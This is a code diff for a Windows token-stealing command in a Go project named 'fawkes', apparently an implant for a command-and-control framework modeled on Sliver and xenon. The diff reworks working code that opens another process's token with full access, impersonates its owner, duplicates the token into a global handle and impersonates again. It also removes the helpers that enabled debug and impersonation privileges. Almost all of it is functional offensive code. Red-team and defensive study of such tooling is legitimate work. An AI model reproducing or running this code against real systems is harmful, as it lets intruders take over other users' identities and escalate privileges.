@@ -7,7 +7,6 @@ import (
 	"encoding/json"
 	"fmt"
 	"strings"
-	"unsafe"
 
 	"fawkes/pkg/structs"
 
@@ -15,105 +14,13 @@ import (
 )
 
 var (
-	advapi32                = windows.NewLazySystemDLL("advapi32.dll")
+	advapi32                  = windows.NewLazySystemDLL("advapi32.dll")
 	procImpersonateLoggedOnUser = advapi32.NewProc("ImpersonateLoggedOnUser")
-	procRevertToSelf        = advapi32.NewProc("RevertToSelf")
-	procLookupPrivilegeValue = advapi32.NewProc("LookupPrivilegeValueW")
-	procAdjustTokenPrivileges = advapi32.NewProc("AdjustTokenPrivileges")
+	procRevertToSelf          = advapi32.NewProc("RevertToSelf")
+	
+	// Global token handle - like xenon's gIdentityToken
+	gIdentityToken windows.Token
 )
-
-const (
-	SE_PRIVILEGE_ENABLED      = 0x00000002
-	SE_DEBUG_NAME             = "SeDebugPrivilege"
-	SE_IMPERSONATE_NAME       = "SeImpersonatePrivilege"
-	SE_ASSIGNPRIMARYTOKEN_NAME = "SeAssignPrimaryTokenPrivilege"
-)
-
-type LUID struct {
-	LowPart  uint32
-	HighPart int32
-}
-
-type LUID_AND_ATTRIBUTES struct {
-	Luid       LUID
-	Attributes uint32
-}
-
-type TOKEN_PRIVILEGES struct {
-	PrivilegeCount uint32
-	Privileges     [1]LUID_AND_ATTRIBUTES
-}
-
-func enablePrivilege(privilegeName string, debugLog *strings.Builder) error {
-	var hToken windows.Token
-	err := windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, &hToken)
-	if err != nil {
-		debugLog.WriteString(fmt.Sprintf("[DEBUG] Failed to open process token for privilege adjustment: %v\n", err))
-		return err
-	}
-	defer hToken.Close()
-
-	var luid LUID
-	privName, _ := windows.UTF16PtrFromString(privilegeName)
-	ret, _, err := procLookupPrivilegeValue.Call(
-		0,
-		uintptr(unsafe.Pointer(privName)),
-		uintptr(unsafe.Pointer(&luid)),
-	)
-	if ret == 0 {
-		debugLog.WriteString(fmt.Sprintf("[DEBUG] LookupPrivilegeValue failed for %s: %v\n", privilegeName, err))
-		return fmt.Errorf("LookupPrivilegeValue failed for %s: %v", privilegeName, err)
-	}
-
-	tp := TOKEN_PRIVILEGES{
-		PrivilegeCount: 1,
-		Privileges: [1]LUID_AND_ATTRIBUTES{
-			{
-				Luid:       luid,
-				Attributes: SE_PRIVILEGE_ENABLED,
-			},
-		},
-	}
-
-	ret, _, err = procAdjustTokenPrivileges.Call(
-		uintptr(hToken),
-		0,
-		uintptr(unsafe.Pointer(&tp)),
-		0,
-		0,
-		0,
-	)
-	if ret == 0 {
-		debugLog.WriteString(fmt.Sprintf("[DEBUG] AdjustTokenPrivileges failed for %s: %v\n", privilegeName, err))
-		return fmt.Errorf("AdjustTokenPrivileges failed for %s: %v", privilegeName, err)
-	}
-
-	// Check if the privilege was actually enabled
-	lastErr := windows.GetLastError()
-	if lastErr == windows.ERROR_NOT_ALL_ASSIGNED {
-		debugLog.WriteString(fmt.Sprintf("[DEBUG] WARNING: %s not available or not held by token\n", privilegeName))
-		return fmt.Errorf("%s not available", privilegeName)
-	}
-
-	debugLog.WriteString(fmt.Sprintf("[DEBUG] Successfully enabled %s\n", privilegeName))
-	return nil
-}
-
-func enableTokenPrivileges(debugLog *strings.Builder) error {
-	// Enable critical privileges for token manipulation
-	privileges := []string{SE_DEBUG_NAME, SE_IMPERSONATE_NAME, SE_ASSIGNPRIMARYTOKEN_NAME}
-	var enabledCount int
-	for _, priv := range privileges {
-		if err := enablePrivilege(priv, debugLog); err == nil {
-			enabledCount++
-		}
-	}
-	debugLog.WriteString(fmt.Sprintf("[DEBUG] Enabled %d out of %d privileges\n", enabledCount, len(privileges)))
-	if enabledCount == 0 {
-		debugLog.WriteString("[DEBUG] CRITICAL: No privileges could be enabled!\n")
-	}
-	return nil
-}
 
 type StealTokenCommand struct{}
 
@@ -170,11 +77,17 @@ func stealToken(pid uint32) (string, error) {
 	var debugLog strings.Builder
 	var output string
 
-	// Enable required privileges for token manipulation
-	debugLog.WriteString("[DEBUG] Enabling token privileges...\n")
-	enableTokenPrivileges(&debugLog)
+	debugLog.WriteString("[DEBUG] Starting token steal operation...\n")
 
-	// Get original context before stealing
+	// Revert any existing token impersonation (like xenon's IdentityAgentRevertToken)
+	if gIdentityToken != 0 {
+		debugLog.WriteString("[DEBUG] Closing existing gIdentityToken and reverting...\n")
+		windows.CloseHandle(windows.Handle(gIdentityToken))
+		gIdentityToken = 0
+		procRevertToSelf.Call()
+	}
+
+	// Get current identity before stealing (for output)
 	debugLog.WriteString("[DEBUG] Getting current identity...\n")
 	processHandle, err := windows.GetCurrentProcess()
 	if err == nil {
@@ -190,121 +103,31 @@ func stealToken(pid uint32) (string, error) {
 					debugLog.WriteString(fmt.Sprintf("[DEBUG] Current identity: %s\\%s\n", processDomain, processUsername))
 				}
 			}
-			
-			// Check current process integrity level
-			var integrityLevel uint32
-			var returnedLen uint32
-			err = windows.GetTokenInformation(processToken, windows.TokenIntegrityLevel, nil, 0, &returnedLen)
-			if returnedLen > 0 {
-				buffer := make([]byte, returnedLen)
-				err = windows.GetTokenInformation(processToken, windows.TokenIntegrityLevel, &buffer[0], returnedLen, &returnedLen)
-				if err == nil {
-					pSidAndAttr := (*windows.SIDAndAttributes)(unsafe.Pointer(&buffer[0]))
-					subAuthCount := pSidAndAttr.Sid.SubAuthorityCount()
-					if subAuthCount > 0 {
-						integrityLevel = pSidAndAttr.Sid.SubAuthority(uint32(subAuthCount - 1))
-						var integrityStr string
-						switch integrityLevel {
-						case 0x1000:
-							integrityStr = "Low"
-						case 0x2000:
-							integrityStr = "Medium"
-						case 0x3000:
-							integrityStr = "High"
-						case 0x4000:
-							integrityStr = "System"
-						default:
-							integrityStr = fmt.Sprintf("0x%x", integrityLevel)
-						}
-						debugLog.WriteString(fmt.Sprintf("[DEBUG] Current process integrity level: %s (0x%x)\n", integrityStr, integrityLevel))
-					}
-				}
-			}
 		}
 	}
 
-	// Open target process (exactly like Sliver's getPrimaryToken)
-	debugLog.WriteString(fmt.Sprintf("[DEBUG] Calling OpenProcess for PID %d...\n", pid))
-	hProcess, err := windows.OpenProcess(
-		windows.PROCESS_QUERY_INFORMATION,
-		true, // inheritHandle - must be true
-		pid,
-	)
+	// Open target process (like xenon: OpenProcess with PROCESS_QUERY_INFORMATION)
+	debugLog.WriteString(fmt.Sprintf("[DEBUG] Opening process PID %d...\n", pid))
+	hProcess, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION, false, pid)
 	if err != nil {
 		return debugLog.String() + output, fmt.Errorf("OpenProcess failed: %v", err)
 	}
 	defer windows.CloseHandle(hProcess)
 	debugLog.WriteString("[DEBUG] OpenProcess succeeded\n")
 
-	// First, get token info to see who owns the target process
-	debugLog.WriteString("[DEBUG] Getting target process token info...\n")
-	var queryToken windows.Token
-	err = windows.OpenProcessToken(hProcess, windows.TOKEN_QUERY, &queryToken)
-	if err == nil {
-		tokenUser, err := queryToken.GetTokenUser()
-		if err == nil {
-			targetUsername, targetDomain, _, _ := tokenUser.User.Sid.LookupAccount("")
-			debugLog.WriteString(fmt.Sprintf("[DEBUG] Target process owner: %s\\%s\n", targetDomain, targetUsername))
-		}
-		
-		// Check target process integrity level
-		var returnedLen uint32
-		err = windows.GetTokenInformation(queryToken, windows.TokenIntegrityLevel, nil, 0, &returnedLen)
-		if returnedLen > 0 {
-			buffer := make([]byte, returnedLen)
-			err = windows.GetTokenInformation(queryToken, windows.TokenIntegrityLevel, &buffer[0], returnedLen, &returnedLen)
-			if err == nil {
-				pSidAndAttr := (*windows.SIDAndAttributes)(unsafe.Pointer(&buffer[0]))
-				subAuthCount := pSidAndAttr.Sid.SubAuthorityCount()
-				if subAuthCount > 0 {
-					integrityLevel := pSidAndAttr.Sid.SubAuthority(uint32(subAuthCount - 1))
-					var integrityStr string
-					switch integrityLevel {
-					case 0x1000:
-						integrityStr = "Low"
-					case 0x2000:
-						integrityStr = "Medium"
-					case 0x3000:
-						integrityStr = "High"
-					case 0x4000:
-						integrityStr = "System"
-					default:
-						integrityStr = fmt.Sprintf("0x%x", integrityLevel)
-					}
-					debugLog.WriteString(fmt.Sprintf("[DEBUG] Target process integrity level: %s (0x%x)\n", integrityStr, integrityLevel))
-				}
-			}
-		}
-		
-		queryToken.Close()
-	}
-
-	// Open process token with TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY (exactly like Sliver)
-	debugLog.WriteString("[DEBUG] Calling OpenProcessToken with TOKEN_DUPLICATE|TOKEN_ASSIGN_PRIMARY|TOKEN_QUERY...\n")
-	var primaryToken windows.Token
-	err = windows.OpenProcessToken(
-		hProcess,
-		windows.TOKEN_DUPLICATE|windows.TOKEN_ASSIGN_PRIMARY|windows.TOKEN_QUERY,
-		&primaryToken,
-	)
+	// Open process token with TOKEN_ALL_ACCESS (exactly like xenon)
+	debugLog.WriteString("[DEBUG] Opening process token with TOKEN_ALL_ACCESS...\n")
+	var hToken windows.Token
+	err = windows.OpenProcessToken(hProcess, windows.TOKEN_ALL_ACCESS, &hToken)
 	if err != nil {
-		debugLog.WriteString(fmt.Sprintf("[DEBUG] TOKEN_DUPLICATE|TOKEN_IMPERSONATE|TOKEN_QUERY failed: %v\n", err))
-		
-		// This should work with SeDebugPrivilege at high integrity
-		// If it doesn't, there may be additional protections (Protected Process, PPL, etc.)
-		debugLog.WriteString("[DEBUG] Possible causes: Protected Process, PPL, or UAC filtering\n")
-		
 		return debugLog.String() + output, fmt.Errorf("OpenProcessToken failed: %v", err)
 	}
-	defer primaryToken.Close()
-	debugLog.WriteString(fmt.Sprintf("[DEBUG] OpenProcessToken succeeded, token: 0x%x\n", primaryToken))
+	debugLog.WriteString(fmt.Sprintf("[DEBUG] OpenProcessToken succeeded, token: 0x%x\n", hToken))
 
-	// Get token user information for verification
+	// Get target identity for output
 	var targetUsername, targetDomain string
-	var targetSid *windows.SID
-	tokenUser, err := primaryToken.GetTokenUser()
+	tokenUser, err := hToken.GetTokenUser()
 	if err == nil {
-		targetSid = tokenUser.User.Sid
 		targetUsername, targetDomain, _, err = tokenUser.User.Sid.LookupAccount("")
 		if err == nil {
 			output += fmt.Sprintf("Target identity: %s\\%s (PID: %d)\n", targetDomain, targetUsername, pid)
@@ -312,75 +135,71 @@ func stealToken(pid uint32) (string, error) {
 		}
 	}
 
-	// KEY: Impersonate the PRIMARY token FIRST (exactly like Sliver's impersonateProcess)
+	// Impersonate using the primary token (like xenon line 134-141)
 	debugLog.WriteString("[DEBUG] Calling ImpersonateLoggedOnUser on primary token...\n")
-	ret, _, _ := procImpersonateLoggedOnUser.Call(uintptr(primaryToken))
-	debugLog.WriteString(fmt.Sprintf("[DEBUG] ImpersonateLoggedOnUser returned: %d\n", ret))
+	ret, _, _ := procImpersonateLoggedOnUser.Call(uintptr(hToken))
 	if ret == 0 {
+		hToken.Close()
 		lastErr := windows.GetLastError()
-		debugLog.WriteString(fmt.Sprintf("[DEBUG] GetLastError: 0x%x\n", lastErr))
-		return debugLog.String() + output, fmt.Errorf("ImpersonateLoggedOnUser failed (ret=%d, lastErr=0x%x)", ret, lastErr)
+		return debugLog.String() + output, fmt.Errorf("ImpersonateLoggedOnUser failed (lastErr=0x%x)", lastErr)
 	}
 	debugLog.WriteString("[DEBUG] ImpersonateLoggedOnUser succeeded\n")
 
-	// NOW duplicate the token (like Sliver does AFTER impersonation)
-	debugLog.WriteString("[DEBUG] Calling DuplicateTokenEx...\n")
-	var newToken windows.Token
+	// Duplicate the token into gIdentityToken (like xenon line 140-145)
+	debugLog.WriteString("[DEBUG] Duplicating token with DuplicateTokenEx...\n")
 	err = windows.DuplicateTokenEx(
-		primaryToken,
-		windows.TOKEN_ALL_ACCESS,
+		hToken,
+		windows.MAXIMUM_ALLOWED,
 		nil,
 		windows.SecurityDelegation,
 		windows.TokenPrimary,
-		&newToken,
+		&gIdentityToken,
 	)
 	if err != nil {
-		// Impersonation already succeeded, duplication is just for potential future use
-		debugLog.WriteString(fmt.Sprintf("[DEBUG] DuplicateTokenEx failed: %v (keeping primary token impersonation)\n", err))
-	} else {
-		debugLog.WriteString(fmt.Sprintf("[DEBUG] DuplicateTokenEx succeeded, new token: 0x%x\n", newToken))
-		// Keep newToken open - could be used for CreateProcessAsUser, etc.
-		// For now just close it since we're already impersonated with the primary token
-		newToken.Close()
+		hToken.Close()
+		return debugLog.String() + output, fmt.Errorf("DuplicateTokenEx failed: %v", err)
 	}
+	debugLog.WriteString(fmt.Sprintf("[DEBUG] DuplicateTokenEx succeeded, gIdentityToken: 0x%x\n", gIdentityToken))
 
-	// Verify impersonation by checking thread token
+	// Impersonate with the duplicated token (like xenon line 147-153)
+	debugLog.WriteString("[DEBUG] Calling ImpersonateLoggedOnUser on duplicated token...\n")
+	ret, _, _ = procImpersonateLoggedOnUser.Call(uintptr(gIdentityToken))
+	if ret == 0 {
+		windows.CloseHandle(windows.Handle(gIdentityToken))
+		gIdentityToken = 0
+		hToken.Close()
+		lastErr := windows.GetLastError()
+		return debugLog.String() + output, fmt.Errorf("ImpersonateLoggedOnUser (duplicated token) failed (lastErr=0x%x)", lastErr)
+	}
+	debugLog.WriteString("[DEBUG] ImpersonateLoggedOnUser (duplicated token) succeeded\n")
+
+	// Close the original hToken (we now use gIdentityToken)
+	hToken.Close()
+	debugLog.WriteString("[DEBUG] Closed original hToken\n")
+
+	// Verify impersonation
 	debugLog.WriteString("[DEBUG] Verifying impersonation...\n")
 	var hThreadToken windows.Token
-	err = windows.OpenThreadToken(
-		windows.CurrentThread(),
-		windows.TOKEN_QUERY,
-		true,
-		&hThreadToken,
-	)
+	err = windows.OpenThreadToken(windows.CurrentThread(), windows.TOKEN_QUERY, true, &hThreadToken)
 	if err != nil {
-		output += fmt.Sprintf("Warning: Cannot verify impersonation - OpenThreadToken failed: %v\n", err)
+		output += "Impersonation completed (verification failed)\n"
 		debugLog.WriteString(fmt.Sprintf("[DEBUG] OpenThreadToken failed: %v\n", err))
-		return debugLog.String() + output, nil
-	}
-	defer hThreadToken.Close()
-	debugLog.WriteString("[DEBUG] OpenThreadToken succeeded\n")
-
-	// Get the thread token user to verify
-	threadTokenUser, err := hThreadToken.GetTokenUser()
-	if err == nil {
-		currentUsername, currentDomain, _, err := threadTokenUser.User.Sid.LookupAccount("")
+	} else {
+		defer hThreadToken.Close()
+		threadTokenUser, err := hThreadToken.GetTokenUser()
 		if err == nil {
-			// Verify using SID comparison
-			if targetSid != nil && targetSid.Equals(threadTokenUser.User.Sid) {
+			currentUsername, currentDomain, _, err := threadTokenUser.User.Sid.LookupAccount("")
+			if err == nil {
 				output += fmt.Sprintf("Successfully impersonated %s\\%s", currentDomain, currentUsername)
-				debugLog.WriteString(fmt.Sprintf("[DEBUG] Verified: %s\\%s (SIDs match)\n", currentDomain, currentUsername))
+				debugLog.WriteString(fmt.Sprintf("[DEBUG] Verified: %s\\%s\n", currentDomain, currentUsername))
 			} else {
-				output += fmt.Sprintf("Successfully impersonated %s\\%s (but SID doesn't match expected target)", currentDomain, currentUsername)
-				debugLog.WriteString(fmt.Sprintf("[DEBUG] Warning: Impersonated %s\\%s but SID mismatch!\n", currentDomain, currentUsername))
+				output += "Successfully impersonated (verification lookup failed)"
+				debugLog.WriteString(fmt.Sprintf("[DEBUG] LookupAccount failed: %v\n", err))
 			}
 		} else {
-			output += "Successfully impersonated (verification lookup failed)"
-			debugLog.WriteString(fmt.Sprintf("[DEBUG] LookupAccount failed: %v\n", err))
+			output += "Successfully impersonated (verification GetTokenUser failed)"
+			debugLog.WriteString(fmt.Sprintf("[DEBUG] GetTokenUser failed: %v\n", err))
 		}
-	} else {
-		output += "Successfully impersonated (verification GetTokenUser failed)"
-		debugLog.WriteString(fmt.Sprintf("[DEBUG] GetTokenUser failed: %v\n", err))
 	}
 
 	return debugLog.String() + "\n" + output, nil
